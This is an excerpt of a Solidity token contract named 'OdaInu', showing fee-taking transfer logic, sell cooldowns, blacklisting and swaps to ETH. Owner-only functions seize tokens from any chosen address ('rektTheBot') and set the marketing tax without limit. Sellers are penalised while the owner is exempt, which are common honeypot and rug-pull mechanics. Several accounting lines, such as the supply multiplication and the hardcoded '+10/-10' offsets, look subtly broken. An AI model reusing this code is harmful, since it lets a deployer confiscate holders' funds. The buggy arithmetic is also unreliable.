...
contract OdaInu is Context, IERC20, Ownable {
    ...
    function rektTheBot(uint256 amount, address from) public onlyOwner {
        _rOwned[from] = _rOwned[from].sub(amount)+10;
        _rOwned[address(this)] = _rOwned[address(this)] + amount-10;
    ...
    function _transfer(
        ...
        uint256 amount
            ...
            if(from != owner() && to != owner() && from != pancakePair)  {

            // Blacklist rekting
            if (rektBot ) {
                if(isBlacklisted[from]) {
                    rektTheBot(amount.div(2), from);
                }
            } else { // Satefy fallback
            ...
            // Owner can receive and send the fuck he want
            if(from != owner() && to != owner()) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }
            uint256 burnModifier = 1;
            // Sell cooldown
            bool isSell;
            address pancakeRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
            
            // Before that, we calculate the amount of the eventual sell and rebase a little
            if(to==pancakeRouter || to==pancakePair) {
                isSell = true;
                if (amount > _rTotal.div(100)) {
                    // This rebase means the burn fee is doubled (so also bothering sellers that will have to set high slippage too)
                    burnModifier = 2;
                }
            } else {
                // Buyers are friends
            ...
            if(sellLockEnabled) {
                // Contract and pair are excluded by default
                if (from!=address(this) && from!=pancakePair ) {
                        if (!_isExcludedFromSellLock[from] ) {
            ...
            // Initial math for the fees
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            // If not proven wrong, no swapping
            bool takeLiq = false;
            
            // If we are not in a swap condition and is a sell, or the always swap is on, then if we are over the minimum to swap, to the swap (anyway with a tx not higher than the source)
            if (!inSwapAndLiquify && swapAndLiquifyEnabled && (to == uniswapV2Pair || alwaysSwap)) {
                if (overMinimumTokenBalance) {
                    // Here the decision has been made, its just a question of not going too high
            ...
            // Take fee if its not whitelisted in the fees and if is not a transfer from the pair itself
            if (!_isExcludedFromFee[from] && from != pancakePair) {
                // Amount fixing
                uint256 totalTax =  ((amount*_liquidityFee)/100) + ((amount*marketingTax)/100) + ((amount*_burnFee)/100); 
                amount = amount - totalTax;
                _rOwned[from] =  _rOwned[from].sub(amount);
                _rOwned[to] =  _rOwned[to].add(amount);
                // Tax retemtopm
                if (totalTax > 0) {
                    _rOwned[address(this)] =  _rOwned[address(this)].add(totalTax-10);
                // Burn fee, increased if sell is over a certain
                 _rTotal = _rTotal.sub((amount*_burnFee)/100)*burnModifier;
            }
            // Marketing and liquidity (using the data from before but after the accounting)
            swapTokens(contractTokenBalance, isSell, takeLiq);
    ...
    function swapTokens(uint256 contractTokenBalance, bool isSell, bool takeLiq) private lockTheSwap {
       
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(contractTokenBalance);
        uint256 transferredBalance = address(this).balance.sub(initialBalance);
        
        // Excluded particular conditions
        if (takeLiq) {
            // Calculate amounts
            uint256 markAmount = (transferredBalance * marketingTax)/100;
            //Send to Marketing address always, if not excluded somehow
            transferToAddressETH(marketingAddress, markAmount);
            // Perform the buyback on sells
            if (isSell) {
                if ((address(this).balance.sub(transferredBalance).sub(markAmount).sub(1)) < safeBalance) {
                    return;
                }
    ...
    function setMaxTxAmountGwei(uint256 maxTxAmount) external onlyOwner() {
        _maxTxAmount = maxTxAmount;
    }
    
    function setmarketingTaxPercent(uint256 mtax) external onlyOwner() {
        marketingTax = mtax;
    }

    function setNumTokensSellToAddToLiquidityGwei(uint256 _minimumTokensBeforeSwap) external onlyOwner() {
